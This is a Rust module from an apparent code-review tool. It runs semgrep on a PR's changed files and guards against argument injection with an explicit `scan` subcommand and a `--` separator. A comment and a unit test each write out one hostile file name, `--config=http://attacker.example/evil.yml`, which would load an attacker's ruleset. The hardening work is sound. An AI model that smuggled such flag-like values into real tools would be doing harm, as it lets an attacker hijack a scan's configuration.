use std::path::PathBuf;
use std::process::Command;

/// semgrep이 PATH에 있으면 변경 파일 대상으로 실행해 deterministic_results 형태로 변환.
/// 없거나 실행/파싱에 실패하면 None — 호출부는 기존 NOT_RUN 경로로 폴백한다(추측 결과를 지어내지 않음).
/// dependency_sca/dataflow_taint/api_deprecation은 `--config=auto` 기본 룰셋만으로는
/// 못 채우므로 건드리지 않는다(NOT_RUN 유지).
/// `changed_files`는 리뷰 대상 PR 작성자가 완전히 통제하는 값이다 — 파일 경로가
/// `-`로 시작하면(예: `--config=http://attacker.example/evil.yml`이라는 이름의 실제 파일)
/// `--` 구분자 없이 그대로 넘길 경우 semgrep 자체 인자 파서가 이를 플래그로 오인해
/// 스캔 설정(룰셋 출처 등)을 공격자가 override할 수 있다. `--`로 이후 전부를
/// 위치 인자로 강제 고정한다.
///
/// 실제 semgrep 1.172.0 바이너리로 검증: `scan` 서브커맨드를 명시하지 않고(semgrep의
/// "서브커맨드 생략 시 scan으로 취급" 편의 기능에 의존) `--`만 붙이면 `--`가 조용히
/// 무시되고 `--config=`로 시작하는 파일명이 여전히 플래그로 파싱된다(Click의 top-level
/// group이 기본 커맨드로 위임할 때 `--`를 올바르게 전달하지 않는 것으로 보임) —
/// `semgrep --config=auto --json --quiet -- <악성파일명>`은 그대로 뚫린다. `scan`을
/// 명시하면(`semgrep scan --config=auto ... -- <파일>`) `--` 이후가 정확히 위치
/// 인자로 처리된다. 이전 수정(`--`만 추가)은 이 서브커맨드 생략 경로에서는 무력했다.
fn build_args<'a>(existing: &[&'a str]) -> Vec<&'a str> {
    let mut args = vec!["scan", "--config=auto", "--json", "--quiet", "--"];
    args.extend_from_slice(existing);
    args
}

pub fn try_run(changed_files: &[String]) -> Option<serde_json::Value> {
    let bin = which("semgrep")?;
    let existing: Vec<&str> = changed_files
        .iter()
        .map(|s| s.as_str())
        .filter(|f| std::path::Path::new(f).exists())
        .collect();
    if existing.is_empty() {
        return None;
    }

    let output = Command::new(&bin)
        .args(build_args(&existing))
        .output()
        .ok()?;
    let v: serde_json::Value = serde_json::from_slice(&output.stdout).ok()?;
    let results = v.get("results")?.as_array()?;
    let has_findings = !results.is_empty();
    let secrets_hit = results.iter().any(|r| {
        r.get("check_id")
            .and_then(|c| c.as_str())
            .map(|c| c.contains("secret") || c.contains("hardcoded"))
            .unwrap_or(false)
    });

    Some(serde_json::json!({
        "sast": {
            "status": if has_findings { "fail" } else { "pass" },
            "evidence": format!("semgrep --config=auto 자동 실행: {} findings", results.len()),
        },
        "secrets": {
            "status": if secrets_hit { "fail" } else { "pass" },
            "evidence": "semgrep --config=auto 결과 기반 — 전용 secrets 스캐너 아니므로 참고용",
        },
    }))
}

fn which(bin: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).find_map(|dir| find_executable(&dir, bin))
}

/// `is_file()`만으로는 부족하다 — Unix는 실행 권한 비트가 없는 파일도 통과시키고(spawn 시점에야
/// 실패), Windows는 보통 확장자 없는 "semgrep"이 아니라 "semgrep.exe"/"semgrep.cmd"로 설치되므로
/// PATHEXT를 안 보면 아예 못 찾는다. 둘 다 실패하면 semgrep이 실제로 있어도 조용히 NOT_RUN으로 샌다.
#[cfg(unix)]
fn find_executable(dir: &std::path::Path, bin: &str) -> Option<PathBuf> {
    use std::os::unix::fs::PermissionsExt;
    let full = dir.join(bin);
    let meta = full.metadata().ok()?;
    if meta.is_file() && meta.permissions().mode() & 0o111 != 0 {
        Some(full)
    } else {
        None
    }
}

#[cfg(windows)]
fn find_executable(dir: &std::path::Path, bin: &str) -> Option<PathBuf> {
    let exact = dir.join(bin);
    if exact.is_file() {
        return Some(exact);
    }
    let pathext = std::env::var("PATHEXT").unwrap_or_else(|_| ".EXE;.CMD;.BAT;.COM".to_string());
    pathext.split(';').find_map(|ext| {
        let candidate = dir.join(format!("{bin}{ext}"));
        candidate.is_file().then_some(candidate)
    })
}

#[cfg(not(any(unix, windows)))]
fn find_executable(dir: &std::path::Path, bin: &str) -> Option<PathBuf> {
    let full = dir.join(bin);
    full.is_file().then_some(full)
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    fn temp_dir(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("codereview-loop-semgrep-which-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn find_executable_rejects_non_executable_file() {
        let dir = temp_dir("non-exec");
        let bin_path = dir.join("semgrep");
        std::fs::write(&bin_path, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin_path, std::fs::Permissions::from_mode(0o644)).unwrap();

        assert!(find_executable(&dir, "semgrep").is_none());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn find_executable_accepts_executable_file() {
        let dir = temp_dir("exec");
        let bin_path = dir.join("semgrep");
        std::fs::write(&bin_path, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin_path, std::fs::Permissions::from_mode(0o755)).unwrap();

        assert_eq!(find_executable(&dir, "semgrep"), Some(bin_path));

        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[cfg(test)]
mod build_args_tests {
    use super::*;

    #[test]
    fn build_args_starts_with_explicit_scan_subcommand() {
        // 실제 semgrep 바이너리로 검증: 서브커맨드 생략(암묵적 scan)에 의존하면 --가
        // 조용히 무시된다 — scan을 명시해야 -- 이후가 실제로 위치 인자로 처리된다.
        let args = build_args(&["src/main.rs"]);
        assert_eq!(args[0], "scan");
    }

    #[test]
    fn build_args_places_separator_before_file_list() {
        let existing = vec!["src/main.rs", "src/lib.rs"];
        let args = build_args(&existing);
        let sep = args
            .iter()
            .position(|a| *a == "--")
            .expect("-- separator missing");
        assert!(
            args[1..sep].iter().all(|a| a.starts_with('-')),
            "scan 다음부터 -- 전까지는 전부 실제 플래그여야 함"
        );
        assert_eq!(&args[sep + 1..], existing.as_slice());
    }

    #[test]
    fn build_args_keeps_flag_like_filename_as_positional() {
        // PR이 만든 실제 파일명이 플래그처럼 생긴 경우 — -- 뒤에 있으면 semgrep이
        // 위치 인자로만 해석해야 한다(파서 오인으로 인한 설정 탈취 방지).
        let existing = vec!["--config=http://attacker.example/evil.yml"];
        let args = build_args(&existing);
        let sep = args.iter().position(|a| *a == "--").unwrap();
        assert_eq!(&args[sep + 1..], existing.as_slice());
    }
}
